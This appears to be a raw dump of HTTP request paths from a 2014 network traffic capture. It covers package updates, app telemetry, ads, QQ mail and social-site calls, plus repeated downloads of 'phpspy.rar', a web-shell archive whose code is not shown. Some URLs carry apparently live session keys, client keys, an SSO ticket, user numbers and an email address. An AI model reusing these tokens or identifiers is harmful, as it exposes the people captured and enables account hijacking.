+/v.gif?mod=superplus:weather&submod=weather_tpl&utype=&superver=superplus&portrait=8d7971713239373239323031380712&glogid=3330532376&type=2011&pid=315&version=PCHome&terminal=PC&qid=0x95d90fd90006cb5f&sid=10148_10278_1424_9993_7800_10268_10211_10121_10210_10017_10178_9498_10051_10065_9770_10096_10007_10236_10257_9979_9024&super_frm=&from_login=&from_reg=&query=&curcard=1&curcardtab=&_r=0.04348706919699907&m=superplus:weather_weatherShow&logactid=5000000000&showType=weatherMod
+/static/tipsplus/js/tips_mods_80197088.js
+/home/xman/data/treasuretips?_req_seqid=0x95d90fd90006cb5f&asyn=1&t=1417222193570&sid=10148_10278_1424_9993_7800_10268_10211_10121_10210_10017_10178_9498_10051_10065_9770_10096_10007_10236_10257_9979_9024
+/Login/self_information
+/q
+/apps/update5/dictupdate.xml?ver=760&client=deskdict&id=b619072eb38a67fe7&vendor=qiang.youdao&in=YoudaoDictFull&appVer=6.2.54.2064&appZengqiang=1&abTest=2
+/Login
+/apps/log.html?keyfrom=deskdict.main&action=SHOW&ctype=MainWnd&rnd=1d00b6e:6194bc70&&appVer=6.2.54.2064&vendor=qiang.youdao&id=b619072eb38a67fe7&abTest=2
+/query?1754948
+/cruel/
+/web/static/styles/result_2014.css
+/news/2014/0326/20140326032922709.jpg
+/web/static/images/beauty.gif
+/web/static/images/newyear.gif
+/web/recomm/images/hanyu070301.jpg
+/news/word/fengling_s.jpg?v=5552
+/web/static/images/bg_index2.gif
+/web/static/images/version1.png
+/web/static/images/bg_weixin.gif
+/web/common_top/top.css
+/web/webiciba_common_top/iciba_common_top_v4w.js
+/web/static/scripts/icibafooter.js
+/web/static/images/mobile.png
+/web/common_top/top.gif
+/news/2014/0911/20140911111401953.gif
+/web/static/scripts/event.min.js
+/web/static/images/bg_index.gif
+/web/static/scripts/basic-2013-09-27.js?v=20130322
+/web/user/js/open_login.js
+/huaci/huaci.js
+/information/progress
+/top/asound.swf
+/imp/request.s?syndid=61&memberid=620&op=r&strategy=brand&tn=text_655_30&width=655&height=30&req=deskdict.main6.2.54.2064&uid=b619072eb38a67fe7&rnd=0&appVer=6.2.54.2064
+/static/images/swf/asound.swf
+/huaci/mini.css
+/huaci/dict.php
+/huaci/ICIBA_HUACI_COM.js
+/huaci/bg.gif
+/web/static/scripts/kds2_record.js
+/ds2rd.php?h=http://www.iciba.com/cruel/&r=https://www.google.com.hk/&t=cruel是什么意思_cruel的翻译_音标_读音_用法_例句_爱词霸在线词典&s=1366x768&c=24&p=19&b=Chrome&v=39.0.2171.71&o=Win7&rd885710684&u=1403360548329511532867
+/favicon.ico
+/information/rank
+/qqshow/admindata/comdata/vip_big_emoji_clientdata/xydata.js
+/qqshow/admindata/comdata/vip_big_emoji_clientdata/sha1.9785164bb520be8694f98977cabd8328db1cd569.png
+/qqshow/admindata/comdata/vip_big_emoji_clientdata/sha1.fdab9d91c4f75290f4184669a7187f3bef291651.png
+/msdownload/update/v3/static/trustedr/en/disallowedcertstl.cab?1f4374e21458f1e7
+/qqshow/admindata/comdata/vip_big_emoji_clientdata/sha1.7740a18a91496333e16feb8fd39d06891d4dd269.png
+/qqshow/admindata/comdata/vip_big_emoji_clientdata/sha1.a51a206c8727e194693a4fc49a4c6b934897aca7.png
+/qqshow/admindata/comdata/vip_big_emoji_clientdata/sha1.346b7fbfc6015ad2c8ddf0f48bb333fb9a622fc0.png
+/qqshow/admindata/comdata/vip_big_emoji_clientdata/sha1.1783f2ee5423df6e9a7b326e2e2857c80980e319.png
+/qqshow/admindata/comdata/vip_big_emoji_clientdata/sha1.66a47eb37e71171290004aebafaba584c5a10b4b.png
+/welcome
+/Login/inner_announce
+/apps/wordstroke/nowordstroke.xml
+/poll?r=0.21869581952465356&u=345402597&s=7&k=-olgoDNk5WyWFNdd&t=0&i=30&r=0.3011586658320625
+/apps/clientindex5/index.cab.md5?keyfrom=deskdict&client=deskdict&id=b619072eb38a67fe7&vendor=qiang.youdao&in=YoudaoDictFull&appVer=6.2.54.2064&appZengqiang=1&abTest=2&HART=93&HAC=1&HTC=0&UART=78&UAC=1&UTC=0&UIP=220.181.76.23&DN=0&skin=null&wsc=0&wsqc=0&wsisc=0&wsicc=0&ocrdl=0&ocrsd=0&faqcnt=0&zqfaqcnt=0&ljfaqcnt=0&olcnt=0&rnd=1d00b6e:63ff53d0
+/crls/secureca.crl
+/imp/modules/eadd/dict_bottom/adCpc.html?syndid=61&memberid=620&tn=text_655_30&width=655&height=30
+/infoline?apiversion=2&mode=publish&client=deskdict&abtest=2&date=2014-11-29&style=head
+/infoline?apiversion=2&mode=publish&client=deskdict&abtest=2&startDate=2014-11-14&endDate=2014-11-29
+/imp/modules/eadd/dict_bottom/js/cpc.js
+/ubuntu/dists/saucy/InRelease
+/imp/modules/eadd/dict_bottom/js/util.js?randid=100
+/ubuntu/dists/saucy-updates/InRelease
+/imp/request.s?op=r&strategy=cpc&syndid=61&memberid=620&tn=text_655_30&width=655&height=30&uid=b619072eb38a67fe7&appVer=6.2.54.2064&req=deskdict.main6.2.54.2064&vendor=qiang.youdao&callback=_jsonpCallBack_
+/ubuntu/dists/saucy-backports/InRelease
+/wp-content/uploads/2013/09/phpspy.rar
+/ubuntu/dists/saucy-security/InRelease
+/ubuntu/dists/saucy/Release.gpg
+/wp-content/uploads/2013/09/phpspy.rar
+/ubuntu/dists/saucy-updates/Release.gpg
+/ubuntu/dists/saucy-backports/Release.gpg
+/ubuntu/dists/saucy/Release
+/MEQwQjBAMD4wPDAJBgUrDgMCGgUABBSxtDkXkBa3l3lQEfFgudSiPNvt7gQUAPkqw0GRtsnCuD5V8sCXEROgByACAwI20A==
+/ubuntu/dists/saucy-updates/Release
+/ubuntu/dists/saucy-backports/Release
+/gchatpic_new/2083596077/2083596077-2921794485-F8846C6DA70E3421466A6BB0080BCCCF/0?vuin=648629762&term=1
+/
+/ubuntu/dists/saucy-security/Release.gpg
+/ubuntu/dists/saucy/main/source/Sources.bz2
+/ubuntu/dists/saucy/restricted/source/Sources.bz2
+/ubuntu/dists/saucy/universe/source/Sources.bz2
+/image?id=2739716694398465412&product=adpublish
+/ubuntu/dists/saucy/multiverse/source/Sources.bz2
+/ubuntu/dists/saucy/main/binary-i386/Packages.bz2
+/ubuntu/dists/saucy/restricted/binary-i386/Packages.bz2
+/image?id=-3946524672621578667&product=adpublish
+/ubuntu/dists/saucy-security/Release
+/ubuntu/dists/saucy/universe/binary-i386/Packages.bz2
+/pushserver/client?app=ydrive&cl=desktop&cto=600000&did=PC4b514f1bb72e25909&pv=1&ver=0
+/pushserver/client?app=ydrive&cl=desktop&cto=600000&did=PC4b514f1bb72e25909&pv=1&ver=0
+/ubuntu/dists/saucy/multiverse/binary-i386/Packages.bz2
+/platform/event_refresh
+/download/HelperUpdate.htm
+/ubuntu/dists/saucy-security/main/source/Sources.bz2
+/ubuntu/dists/saucy/main/i18n/Translation-zh.bz2
+/ubuntu/dists/saucy/main/i18n/Translation-en.bz2
+/ubuntu/dists/saucy/multiverse/i18n/Translation-zh_CN.bz2
+/ubuntu/dists/saucy/multiverse/i18n/Translation-zh.bz2
+/ubuntu/dists/saucy/multiverse/i18n/Translation-en.bz2
+/ubuntu/dists/saucy/restricted/i18n/Translation-zh_CN.bz2
+/platform
+/ubuntu/dists/saucy/restricted/i18n/Translation-zh.bz2
+/image?id=-5781307072682399396&product=dict-homepage
+/ubuntu/dists/saucy-security/restricted/source/Sources.bz2
+/ubuntu/dists/saucy/restricted/i18n/Translation-en.bz2
+/msdownload/update/v3/static/trustedr/en/disallowedcertstl.cab?55a8de7670ec127f
+/ubuntu/dists/saucy/universe/i18n/Translation-zh_CN.bz2
+/msg?funcid=getusrnewmsgcnt&username=liuhailong8013@163.com
+/image?id=-8031364398654738924&product=adpublish
+/ubuntu/dists/saucy/universe/i18n/Translation-zh.bz2
+/download/TBHprofileForQQ.ini
+/ubuntu/dists/saucy/universe/i18n/Translation-en.bz2
+/ubuntu/dists/saucy-updates/main/source/Sources.bz2
+/ubuntu/dists/saucy-security/universe/source/Sources.bz2
+/ubuntu/dists/saucy-updates/restricted/source/Sources.bz2
+/ubuntu/dists/saucy-updates/universe/source/Sources.bz2
+/ubuntu/dists/saucy-updates/multiverse/source/Sources.bz2
+/ubuntu/dists/saucy-updates/main/binary-i386/Packages.bz2
+/image?id=-4284798714911839297&product=dict-homepage
+/ubuntu/dists/saucy-security/multiverse/source/Sources.bz2
+/ubuntu/dists/saucy-updates/universe/binary-i386/Packages.bz2
+/ubuntu/dists/saucy-updates/multiverse/binary-i386/Packages.bz2
+/ubuntu/dists/saucy-backports/main/source/Sources.bz2
+/ubuntu/dists/saucy-security/main/binary-i386/Packages.bz2
+/ubuntu/dists/saucy-backports/restricted/source/Sources.bz2
+/ubuntu/dists/saucy-backports/universe/source/Sources.bz2
+/cgi-bin/qqshow_user_props_info
+/ubuntu/dists/saucy-backports/multiverse/source/Sources.bz2
+/ubuntu/dists/saucy-backports/main/binary-i386/Packages.bz2
+/qqshow?clientuin=137845642&clientkey=3A00BA39BE271BA60FBE8F40844CA0076595265A26224D3FAD5061722F623F05&opuin=137845642&ptlang=2052
+/ubuntu/dists/saucy-backports/restricted/binary-i386/Packages.bz2
+/download/HelperUpdate.htm
+/ubuntu/dists/saucy-backports/universe/binary-i386/Packages.bz2
+/ubuntu/dists/saucy-security/restricted/binary-i386/Packages.bz2
+/ubuntu/dists/saucy-backports/multiverse/binary-i386/Packages.bz2
+/cgi-bin/qqshow_user_gdt_ad?adposcount=1&freshinfo={"expire":"","value":""}&freqinfo=null&posid=1&uin=137845642&skey=@IJ8bTqr53&frienduin=494467347&ext={"req":{"friendqq":"494467347","qqshow":"1","sex":"M"}}&opencount=9&cmd=query&action=1
+/ubuntu/dists/saucy-backports/main/i18n/Translation-zh_CN.bz2
+/ubuntu/dists/saucy-backports/main/i18n/Translation-zh.bz2
+/ubuntu/dists/saucy-backports/main/i18n/Translation-en.bz2
+/ubuntu/dists/saucy-backports/multiverse/i18n/Translation-zh_CN.bz2
+/poll?r=0.28050813521258533&u=648629762&s=7&k=H3mhqTxNAk6pJpqp&t=0&i=30&r=0.49240865441970527
+/ubuntu/dists/saucy-backports/multiverse/i18n/Translation-zh.bz2
+/ubuntu/dists/saucy-backports/multiverse/i18n/Translation-en.bz2
+/Login/self_information
+/ubuntu/dists/saucy-security/universe/binary-i386/Packages.bz2
+/fsearch?keyfrom=deskdict.network_test&q=Yodao dict Test&pos=7&doctype=xml&xmlVersion=3.2&dogVersion=1.0&client=deskdict&id=b619072eb38a67fe7&vendor=qiang.youdao&in=YoudaoDictFull&appVer=6.2.54.2064&appZengqiang=1&abTest=2&le=eng&scradv=1&wstate=no&LTH=0&LTHQ=1&proc=YodaoDict.exe
+/ubuntu/dists/saucy-backports/restricted/i18n/Translation-zh.bz2
+/ubuntu/dists/saucy-backports/restricted/i18n/Translation-en.bz2
+/ubuntu/dists/saucy-backports/universe/i18n/Translation-zh_CN.bz2
+/query?1417222198
+/ubuntu/dists/saucy-backports/universe/i18n/Translation-zh.bz2
+/ubuntu/dists/saucy-security/multiverse/binary-i386/Packages.bz2
+/ubuntu/dists/saucy-backports/universe/i18n/Translation-en.bz2
+/ubuntu/dists/saucy/main/i18n/Translation-zh.xz
+/welcome/info
+/ubuntu/dists/saucy/multiverse/i18n/Translation-zh.xz
+/ubuntu/dists/saucy/restricted/i18n/Translation-zh.xz
+/ubuntu/dists/saucy/universe/i18n/Translation-zh.xz
+/ubuntu/dists/saucy-security/main/i18n/Translation-zh_CN.bz2
+/ubuntu/dists/saucy-backports/main/i18n/Translation-zh_CN.xz
+/ubuntu/dists/saucy-backports/main/i18n/Translation-zh.xz
+/ubuntu/dists/saucy-backports/multiverse/i18n/Translation-zh_CN.xz
+/ubuntu/dists/saucy-backports/multiverse/i18n/Translation-zh.xz
+/ubuntu/dists/saucy-security/main/i18n/Translation-zh.bz2
+/ubuntu/dists/saucy-backports/restricted/i18n/Translation-zh_CN.xz
+/ubuntu/dists/saucy-backports/restricted/i18n/Translation-zh.xz
+/ubuntu/dists/saucy-backports/universe/i18n/Translation-zh_CN.xz
+/information/progress
+/ubuntu/dists/saucy-backports/universe/i18n/Translation-zh.xz
+/ubuntu/dists/saucy/main/i18n/Translation-zh.lzma
+/ubuntu/dists/saucy-security/main/i18n/Translation-en.bz2
+/v11/2/windowsupdate/redir/v6-win7sp1-wuredir.cab?1411290049
+/ubuntu/dists/saucy/restricted/i18n/Translation-zh.lzma
+/ubuntu/dists/saucy/universe/i18n/Translation-zh.lzma
+/ubuntu/dists/saucy-backports/main/i18n/Translation-zh_CN.lzma
+/project/phpspy.htm
+/ubuntu/dists/saucy-security/multiverse/i18n/Translation-zh_CN.bz2
+/ubuntu/dists/saucy-backports/main/i18n/Translation-zh.lzma
+/ubuntu/dists/saucy-backports/multiverse/i18n/Translation-zh_CN.lzma
+/ubuntu/dists/saucy-backports/multiverse/i18n/Translation-zh.lzma
+/2/remind/unread_count.json?uid=1992245353&unread_message=1&group_id=221102260100003958&source=140226478
+/ubuntu/dists/saucy-backports/restricted/i18n/Translation-zh_CN.lzma
+/ubuntu/dists/saucy-backports/restricted/i18n/Translation-zh.lzma
+/?ref=&error_page=1
+/ubuntu/dists/saucy-backports/universe/i18n/Translation-zh_CN.lzma
+/ubuntu/dists/saucy-security/multiverse/i18n/Translation-zh.bz2
+/ubuntu/dists/saucy-backports/universe/i18n/Translation-zh.lzma
+/ubuntu/dists/saucy/main/i18n/Translation-zh.gz
+/ubuntu/dists/saucy/multiverse/i18n/Translation-zh.gz
+/ubuntu/dists/saucy/restricted/i18n/Translation-zh.gz
+/ubuntu/dists/saucy/universe/i18n/Translation-zh.gz
+/js/b/client.js
+/js/b/jquery.min.js
+/cpro/ui/domain_parking.js
+/cpro/ui/ci.js
+/js/b/caf.js
+/img/w300/baidu.png
+/ubuntu/dists/saucy-backports/main/i18n/Translation-zh_CN.gz
+/ubuntu/dists/saucy-backports/main/i18n/Translation-zh.gz
+/ubuntu/dists/saucy-backports/multiverse/i18n/Translation-zh_CN.gz
+/ubuntu/dists/saucy-backports/multiverse/i18n/Translation-zh.gz
+/ubuntu/dists/saucy-backports/restricted/i18n/Translation-zh_CN.gz
+/img/w300/sort_search.png
+/ubuntu/dists/saucy-backports/universe/i18n/Translation-zh_CN.gz
+/cpro/ui/noexpire/js/3.2.3/cpro.js
+/cpro/exp/lupage/img/icon_14px.png
+/query?1417222204
+/ubuntu/dists/saucy-backports/universe/i18n/Translation-zh.gz
+/cpro/ui/template_inlay_all.js
+/aj/static/sync.html?t=1417222115202
+/ubuntu/dists/saucy/main/i18n/Translation-zh
+/SPIUninstall.ini
+/SubServiceUninstall.ini
+/ubuntu/dists/saucy/multiverse/i18n/Translation-zh
+/ubuntu/dists/saucy-security/restricted/i18n/Translation-zh_CN.bz2
+/ubuntu/dists/saucy/restricted/i18n/Translation-zh
+/ubuntu/dists/saucy/universe/i18n/Translation-zh
+/ubuntu/dists/saucy-backports/main/i18n/Translation-zh_CN
+/dict.do?title=Cruel&from=lingoes2.9.1&type=1&userip=192.168.191.2
+/ubuntu/dists/saucy-backports/main/i18n/Translation-zh
+/ubuntu/dists/saucy-backports/multiverse/i18n/Translation-zh_CN
+/ubuntu/dists/saucy-security/restricted/i18n/Translation-zh.bz2
+/media/v1/0f000Zcl7pd_3RBJ7KNpYf.jpg
+/media/v1/0f000nTm6xWWNDGNpq-Cd0.jpg
+/media/v1/0f000nTm6myqj19gpq-CS6.jpg
+/media/v1/0f000Fhis8MM9U_ZnIsPZ0.jpg
+/media/v1/0f000aXqGSUAaDc3WBlVtf.jpg
+/ubuntu/dists/saucy-backports/multiverse/i18n/Translation-zh
+/media/v1/0f000DYlKRR0m4XU3jyYjs.jpg
+/ubuntu/dists/saucy-backports/restricted/i18n/Translation-zh_CN
+/media/v1/0f0000gKbgf2WX7hUffi8s.jpg
+/media/v1/0f0005fe9Yi8lICYPOdR9s.jpg
+/media/v1/0f000a4uV5O3XafL8IwjH0.jpg
+/config/pcas.json
+/ubuntu/dists/saucy-backports/restricted/i18n/Translation-zh
+/login?url=http://weibo.com/aj/static/sync.html?t=1417222115202&from=baidu&___ALF=1
+/ubuntu/dists/saucy-backports/universe/i18n/Translation-zh_CN
+/ubuntu/dists/saucy-backports/universe/i18n/Translation-zh
+/ubuntu/dists/saucy-security/restricted/i18n/Translation-en.bz2
+/sso/crosdom?action=login&savestate=1448758203&callback=sinaSSOController.doCrossDomainCallBack&scriptId=ssoscript0&client=ssologin.js(v1.4.2)&_=1417222116056
+/wbsso/login?ssosavestate=1448758203&url=http://weibo.com/login?url=http://weibo.com/aj/static/sync.html?t=1417222115202&from=baidu&___ALF=1&sudaref=weibo.com&ticket=ST-MjQxMjcxODU1NQ==-1417222203-xd-015044D6BE867677718B9D1E525CC50D&retcode=0
+/ubuntu/dists/saucy-security/universe/i18n/Translation-zh_CN.bz2
+/favicon.ico
+/ubuntu/dists/saucy-security/universe/i18n/Translation-zh.bz2
+/a.js?tu=u109200026&did=1&tn=baiduTlinkInlay&word=http://www.dnbiz.cn/domain_parking.htm?site=http%3A%2F%2Fwww.4ngel.net%2F%3Fref%3D%26error_page%3D1&jk=a0e382afda865eae&if=16&aw=735&ah=170&ch=0&n=09066047_2_cpr&js=custInlay&dt=1417222115&pt=1444&ps=20141129084836635&it=1444&vs=1&ft=1444&vt=1444&left=21&top=71&op=100&csp=1366,724&bcl=936,536&pof=960,257&fs=1&total=2
+/a.js?tu=u109200024&did=1&tn=baiduCust&word=http://www.dnbiz.cn/domain_parking.htm?site=http%3A%2F%2Fwww.4ngel.net%2F%3Fref%3D%26error_page%3D1&jk=401c135229a83409&if=24&aw=260&ah=1078&ch=0&n=09066047_2_cpr&js=custInlay&dt=1417222115&pt=1442&ps=20141129084836635&it=942&vs=1&ft=1442&vt=0&left=819&top=73&op=100&csp=1366,724&bcl=920,536&pof=1102,1334&fs=1
+/poll?r=0.6114162490703166&u=915910623&s=7&k=tslONqY336_XNnSx&t=0&i=30&r=0.9540695731993765
+/popo/launch?c=cHA9a3N3bDY3ODA4OTA2OCZ1dWlkPTQ2YjRkNjhiYTUxMDViOGNhMGVlZjYyMjc0N2IwZDJhJmNvbXBpZD1kdWJhLHdlaXNoaSZzdmVyPVdpbjcmbGFzdHBvcHRpbWU9MCZnbD0mcGlkPXdlaXNoaSZ2ZXJzaW9uPTQuNy4wLjQwODcmbGlkPTAmaGlkPTAmY29taWQ9ODU1LDg1Niw4NTcsODU4LDg1OSw4NjAsODYxLDg2Miw4NjMsODY0LDg2NSw4NjYsODY3LDg2OCw4NjksODcwLDg3MSw4NzIsODczLDg3NCw4NzUsODc2LDg3Nyw4NzgsODc5LDg4MCw4ODEsODgyLDg4Myw4ODQmdmlwPW92aXAw
+/ubuntu/dists/saucy-security/universe/i18n/Translation-en.bz2
+/wpad.dat
+/ubuntu/dists/saucy-security/main/i18n/Translation-zh_CN.xz
+/v11/3/windowsupdate/selfupdate/WSUS3/x86/Win7SP1/wsus3setup.cab?1411290050
+/wpad.dat
+/ubuntu/dists/saucy-security/main/i18n/Translation-zh.xz
+/ubuntu/dists/saucy-security/multiverse/i18n/Translation-zh_CN.xz
+/ubuntu/dists/saucy-security/multiverse/i18n/Translation-zh.xz
+/report/
+/agent.cfg
+/admovie.cfg?k=001417222098
+/KsafeSpeedTest/ksafe/queryip.d?ip=61.151.234.40
+/pki/crl/products/microsoftrootcert.crl
+/wp-content/uploads/2013/09/phpspy.rar
+/ubuntu/dists/saucy-security/restricted/i18n/Translation-zh_CN.xz
+/wpad.dat
+/ubuntu/dists/saucy-security/restricted/i18n/Translation-zh.xz
+/wpad.dat
+/
+/v11/2/windowsupdate/redir/v6-win7sp1-wuredir.cab?1411290050
+/ubuntu/dists/saucy-security/universe/i18n/Translation-zh_CN.xz
+/pki/crl/products/MicCodSigPCA_08-31-2010.crl
+/iavs9x/servers.def.vpx
+/information/progress
+/wpad.dat
+/static/plugins/bootstrap/css/bootstrap.min.css
+/static/css/index/userpage.css
+/static/js/jquery-1.10.1.min.js
+/static/image/logout_icon_2.png
+/ubuntu/dists/saucy-security/universe/i18n/Translation-zh.xz
+/wpad.dat
+/
+/Login/userpage
+/ubuntu/dists/saucy-security/main/i18n/Translation-zh_CN.lzma
+/pki/crl/products/WinPCA.crl
+/ubuntu/dists/saucy-security/main/i18n/Translation-zh.lzma
+/wp-content/uploads/2014/10/6619296394211713340.png
+/wp-content/uploads/image/2014/07/230500YD4.jpg
+/wp-content/uploads/image/2014/04/060711Z8u.jpg
+/wp-content/uploads/2013/12/201312050955581.jpg
+/ubuntu/dists/saucy-security/multiverse/i18n/Translation-zh_CN.lzma
+/ubuntu/dists/saucy-security/multiverse/i18n/Translation-zh.lzma
+/yws/device_open/poll?device_id=PC4b514f1bb72e25909
+/iavs9x/prod-ais.vpx
+/ubuntu/dists/saucy-security/restricted/i18n/Translation-zh_CN.lzma
+/
+/ubuntu/dists/saucy-security/universe/i18n/Translation-zh_CN.lzma
+/favicon.ico
+/ubuntu/dists/saucy-security/universe/i18n/Translation-zh.lzma
+/ivps9x/prod-vps.vpx
+/ubuntu/dists/saucy-security/main/i18n/Translation-zh_CN.gz
+/Login
+/ubuntu/dists/saucy-security/main/i18n/Translation-zh.gz
+/zh_CN/htmledition/style/comm2010220516.css
+/zh_CN/htmledition/js/all220562.js
+/ubuntu/dists/saucy-security/multiverse/i18n/Translation-zh_CN.gz
+/ubuntu/dists/saucy-security/multiverse/i18n/Translation-zh.gz
+/information/rank
+/ubuntu/dists/saucy-security/restricted/i18n/Translation-zh_CN.gz
+/wp-content/uploads/2013/09/phpspy.rar
+/ubuntu/dists/saucy-security/restricted/i18n/Translation-zh.gz
+/zh_CN/htmledition/style/today220516.css
+/ubuntu/dists/saucy-security/universe/i18n/Translation-zh_CN.gz
+/zh_CN/htmledition/js/profile_tips220516.js
+/preload/list.js?920589
+/cgi-bin/getwpkey?r=0.7949430358130485&resp_charset=UTF8&ef=js&sid=hnQZ1ISTRPyFUUAU
+/poll?r=0.7306712688878179&u=297292018&s=7&k=Sd8dY7hf8lC4EYdX&t=0&i=30&r=0.09252762445248663
+/ubuntu/dists/saucy-security/universe/i18n/Translation-zh.gz
+/vote2009_v2/getip.aspx?tryno=1611&cid=2
+/zh_CN/htmledition/js/readmail2220ac7.js
+/www/js/common.js
+/zh_CN/htmledition/js/compose2220ac7.js
+/ubuntu/dists/saucy-security/main/i18n/Translation-zh_CN
+/ubuntu/dists/saucy-security/main/i18n/Translation-zh
+/ubuntu/dists/saucy-security/multiverse/i18n/Translation-zh_CN
+/v/
+/
+/zh_CN/htmledition/style/readmail201221e3ef.css
+/favicon.ico
+/ubuntu/dists/saucy-security/multiverse/i18n/Translation-zh
+/Login/self_information
+/F/AAEU0SBc_B9EUotUU95IZHJl
+/ubuntu/dists/saucy-security/restricted/i18n/Translation-zh_CN
+/ubuntu/dists/saucy-security/restricted/i18n/Translation-zh
+/iavs9x/servers.def.vpx
+/ubuntu/dists/saucy-security/universe/i18n/Translation-zh_CN
+/ubuntu/dists/saucy-security/universe/i18n/Translation-zh
+/q
+/Login/inner_announce
+/iavs9x/prod-ais.vpx
+/cgi-bin/readmail?folderid=1&folderkey=1&t=readmail&mailid=ZC3427-3izrZTXOxHwJKjtvPqsZU4b&mode=pre&maxage=3600&base=12.49&ver=18311&sid=hnQZ1ISTRPyFUUAU
+/qconf.php
+/qconf.php
+/qconf.php
+/cgi-bin/readmail?folderid=1&folderkey=1&t=readmail&mailid=ZC1826-rF61_a1tnydTeGk9MaU6e4b&mode=pre&maxage=3600&base=12.49&ver=17707&sid=hnQZ1ISTRPyFUUAU
+/q.cgi
+/q.cgi
+/content/16909
+/information/rank
+/editor/editor.css
+/source/global.js.php
+/editor/editor.js
+/themes/wooyun/images/white-hat.png
+/upload/avatar/avatar_1593.jpg
+/upload/avatar/avatar_1161.jpg
+/upload/avatar/avatar_3877.jpg
+/upload/avatar/avatar_4915.jpg
+/upload/avatar/avatar_4694.png
+/?p=2025182
+/upload/avatar/avatar_55.jpg
+/upload/avatar/avatar_2142.jpg
+/upload/avatar/avatar_773.jpg
+/upload/avatar/avatar_401.jpg
+/upload/avatar/avatar_4915_s.jpg
+/upload/avatar/avatar_1585_s.jpg
+/editor/image.php?uploadedId=comment_content_iu
+/cgi-bin/readmail?folderid=1&folderkey=1&t=readmail&mailid=ZC3420-jnzXPW3UWeGMRFUB_L7EI4b&mode=pre&maxage=3600&base=12.49&ver=17099&sid=hnQZ1ISTRPyFUUAU
+/h.js?3faf3a47435cc512f3b86dc12af100d0
+/hm.gif?cc=1&ck=1&cl=24-bit&ds=1366x768&ep=117014,60379&et=3&fl=15.0&ja=1&ln=zh-CN&lo=0&lt=1417222079&nv=0&rnd=844221749&si=3faf3a47435cc512f3b86dc12af100d0&st=4&su=http://zone.wooyun.org/&v=1.0.70&lv=2
+/hm.gif?cc=1&ck=1&cl=24-bit&ds=1366x768&ep=117014,60379&et=3&fl=15.0&ja=1&ln=zh-CN&lo=0&lt=1417222079&nv=0&rnd=844221749&si=3faf3a47435cc512f3b86dc12af100d0&st=4&su=http://zone.wooyun.org/&v=1.0.70&lv=2&u=http://zone.wooyun.org/act-new
+/hm.gif?cc=1&ck=1&cl=24-bit&ds=1366x768&et=0&fl=15.0&ja=1&ln=zh-CN&lo=0&lt=1417222079&nv=0&rnd=896682523&si=3faf3a47435cc512f3b86dc12af100d0&st=4&su=http://zone.wooyun.org/act-new&v=1.0.70&lv=2
+/ivps9x/prod-vps.vpx
+/Login
+/Login/self_information
+/cgi-bin/tip?sid=hnQZ1ISTRPyFUUAU&tipid=88&s=isshowtip&r=0.11961971572600305
+/static/images/sc.png?cdnversion=20120720
+/static/images/is.png?cdnversion=20131219
+/favicon.ico
+/getnum?url=http://zone.wooyun.org/content/16909&callback=bdShare.fn._getShare&type=load&t=1417222209784
+/q
+/cgi-bin/v.cgi?1=500&flag1=700116&flag2=1
+/content_push
+/qqmail_head/iaKRFl9aLTuuRfunAvheJGibsPpRJPChnCPRCuicAxUu4XHLnkdoozYyRG4KInziaKZlZytKSaz3y6Q/40
+/qzone/biz/comm/js/qbs.js
+/obWFpbD0yOTcyOTIwMThAcXEuY29tJmlkPTE5LjY5OC4xNTMzJnRpbWU9MjAxNDExMjcwMCZtb2R1bGFyPTIxOCZnb3RvPTk0NzE4NA==
+/index.php/Tr-o-q-bWFpbD0yOTcyOTIwMThAcXEuY29tJmlkPTE5LjY5OC4xNTMzJnRpbWU9MjAxNDExMjcwMCZtb2R1bGFyPTIxOCZnb3RvPTk0NzE4NA==
+/poll?r=0.6151099496055394&u=815922797&s=7&k=nqyEMXtnbf6hMD8p&t=0&i=30&r=0.9912787568755448
+/information/progress
+/cgi-bin/qqshow_user_props_info
+/minisite/vipabc20141106/mq_0.jpg
+/minisite/vipabc20141106/mq_1.jpg
+/minisite/vipabc20141106/mq_2.jpg
+/minisite/vipabc20141106/mq_3.jpg
+/minisite/vipabc20141106/mq_4.jpg
+/minisite/vipabc20141106/mq_5.jpg
+/minisite/vipabc20141106/mq_6.jpg
+/qqshow?clientuin=137845642&clientkey=3A00BA39BE271BA60FBE8F40844CA0076595265A26224D3FAD5061722F623F05&opuin=137845642&ptlang=2052
+/minisite/vipabc20141106/mq_9.jpg
+/minisite/vipabc20141106/mq_8.jpg
+/minisite/vipabc20141106/mq_7.jpg
+/cgi-bin/qqshow_user_gdt_ad?adposcount=1&freshinfo={"expire":"","value":""}&freqinfo=null&posid=1&uin=137845642&skey=@IJ8bTqr53&frienduin=494467347&ext={"req":{"friendqq":"494467347","qqshow":"1","sex":"M"}}&opencount=9&cmd=query&action=1
+/upload/image/201411/2014112815365810497.jpg
+/upload/image/201411/2014112815383038563.jpg
+/upload/image/201411/2014112816044964897.jpg
+/qzone/biz/ac/comm/gdtlib.20141124.js
+/v3/safeup_app64.cab?autoupdate=true&pid=h_inst&uid=1&mid=2d97bc2039824752d7080f389a29addc&ver=9.6.0.2003&sysver=6.3.9600.256.1.0&pa=x64&type=tray&rt=1&lt=36&ue=1&language=chs
+/v3/safeup_app64.cab?autoupdate=true&pid=h_inst&uid=1&mid=2d97bc2039824752d7080f389a29addc&ver=9.6.0.2003&sysver=6.3.9600.256.1.0&pa=x64&type=tray&rt=1&lt=36&ue=1&language=chs&gslb=1
+/yasuo/s.html?mid=699f274115930bec6e838e3c0ec1551a&type=113&k1=1&k2=3.2.0.2010&src=360zip
+/ivps9x/part-iex-3.vpx
+/wp-content/themes/twentytwelve/style.css?ver=3.5.1
+/instcomp.htm?soft=20131226&status=0&m=699f274115930bec6e838e3c0ec1551a&src=360zip
+/v.gif?pid=307&type=3075&l=346178&t=253&s=287507&v=775&f=246000&r=http://www.baidu.com/s?ie=utf-8&f=8&rsv_bp=1&rsv_idx=1&tn=baidu&wd=deepin%20linux%20%E8%AE%BE%E7%BD%AE%E9%9D%99%E6%80%81ip&rsv_pq=a2f02b8800068a63&rsv_t=483fpTubvX34op21p1YM%2B8r13IGGinSMSaE45zSnppXln9vcMnCIyPhln7A&rsv_enter=1&inputT=8441&rsv_sug3=54&rsv_sug4=2801&rsv_sug1=21&rsv_sug2=0&u=http://bbs.shendu.com/thread-1880527-1-1.html
+/a.js?ch=0&jk=37d4873fdc36c3fe&n=16site_ik_cpr&tu=u1510803&word=http://bbs.shendu.com/thread-1880527-1-1.html&if=0&aw=468&ah=60&pt=351251&it=29000&vt=29000&csp=1600,860&bcl=1600,775&pof=1600,106&top=38&left=1036&total=2&rdm=1417222211727
